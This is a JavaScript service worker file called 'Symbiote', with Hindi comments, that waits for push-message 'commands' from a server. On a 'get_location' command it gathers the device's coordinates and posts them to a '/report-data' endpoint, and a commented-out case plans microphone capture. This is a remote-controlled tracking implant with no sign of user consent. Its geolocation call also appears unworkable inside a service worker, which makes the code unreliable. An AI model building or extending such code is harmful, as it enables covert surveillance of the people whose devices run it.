// =================================================================
//  "सिम्बायोट" - सर्विस वर्कर (sw.js)
// =================================================================

console.log('सिम्बायोट (सर्विस वर्कर) अब सक्रिय और कमांड के लिए तैयार है।');

// -----------------------------------------------------------------
//  इवेंट लिस्नर 1: 'push' इवेंट
//  यह तब चलता है जब सर्वर से कोई पुश नोटिफिकेशन (कमांड) आता है।
// -----------------------------------------------------------------
self.addEventListener('push', event => {
    console.log('[Service Worker] पुश कमांड प्राप्त हुआ।');

    let commandData;
    try {
        // पुश नोटिफिकेशन के साथ भेजे गए डेटा (कमांड) को पढ़ें
        commandData = event.data.json();
        console.log('[Service Worker] कमांड:', commandData);
    } catch (e) {
        console.error('[Service Worker] कमांड को पढ़ने में विफल:', e);
        return;
    }

    // कमांड के आधार पर संबंधित फ़ंक्शन को कॉल करें
    if (commandData && commandData.command) {
        switch (commandData.command) {
            case 'get_location':
                executeGetLocation();
                break;
            // आप भविष्य में और कमांड यहाँ जोड़ सकते हैं
            // case 'start_mic':
            //     executeStartMic();
            //     break;
            default:
                console.log('[Service Worker] अज्ञात कमांड:', commandData.command);
        }
    }
});


// -----------------------------------------------------------------
//  कमांड को निष्पादित करने वाले फ़ंक्शंस
// -----------------------------------------------------------------

/**
 * कमांड: get_location
 * जियोलोकेशन API का उपयोग करके डिवाइस की वर्तमान लोकेशन प्राप्त करता है
 * और उसे सर्वर को वापस भेजता है।
 */
function executeGetLocation() {
    console.log('[Service Worker] लोकेशन प्राप्त करने का प्रयास कर रहा है...');
    
    // जियोलोकेशन API तक पहुंचने का वादा (Promise)
    const locationPromise = new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            position => resolve(position),
            error => reject(error)
        );
    });

    // जब लोकेशन मिल जाए तो क्या करना है
    locationPromise.then(position => {
        const locationData = {
            type: 'location',
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
        };
        
        console.log('[Service Worker] लोकेशन मिली:', locationData);
        
        // मिली हुई लोकेशन को सर्वर पर भेजें
        sendDataToServer(locationData);

    }).catch(error => {
        console.error('[Service Worker] लोकेशन प्राप्त करने में त्रुटि:', error);
        
        // त्रुटि की जानकारी भी सर्वर को भेजें
        sendDataToServer({
            type: 'error',
            message: 'लोकेशन प्राप्त करने में विफल: ' + error.message
        });
    });
}


/**
 * हेल्पर फ़ंक्शन: इकट्ठा किए गए डेटा को सर्वर पर भेजता है
 * @param {object} data - वह डेटा जिसे सर्वर को भेजना है
 */
function sendDataToServer(data) {
    console.log('[Service Worker] डेटा सर्वर पर भेजा जा रहा है:', data);
    
    // fetch API का उपयोग करके सर्वर के '/report-data' एंडपॉइंट पर POST रिक्वेस्ट भेजें
    fetch('/report-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => {
        if (response.ok) {
            console.log('[Service Worker] डेटा सफलतापूर्वक सर्वर पर भेजा गया।');
        } else {
            console.error('[Service Worker] सर्वर पर डेटा भेजने में विफल।');
        }
    })
    .catch(error => {
        console.error('[Service Worker] सर्वर पर डेटा भेजने में नेटवर्क त्रुटि:', error);
    });
}


// -----------------------------------------------------------------
//  इवेंट लिस्नर 2: 'install' और 'activate'
//  ये सर्विस वर्कर के जीवनचक्र के लिए आवश्यक हैं।
// -----------------------------------------------------------------
self.addEventListener('install', event => {
    console.log('[Service Worker] इंस्टॉल हो रहा है...');
    // नए सर्विस वर्कर को तुरंत सक्रिय करने के लिए
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    console.log('[Service Worker] सक्रिय हो रहा है...');
    // यह सुनिश्चित करता है कि सक्रिय सर्विस वर्कर पेज को नियंत्रित करे
    clients.claim();
});
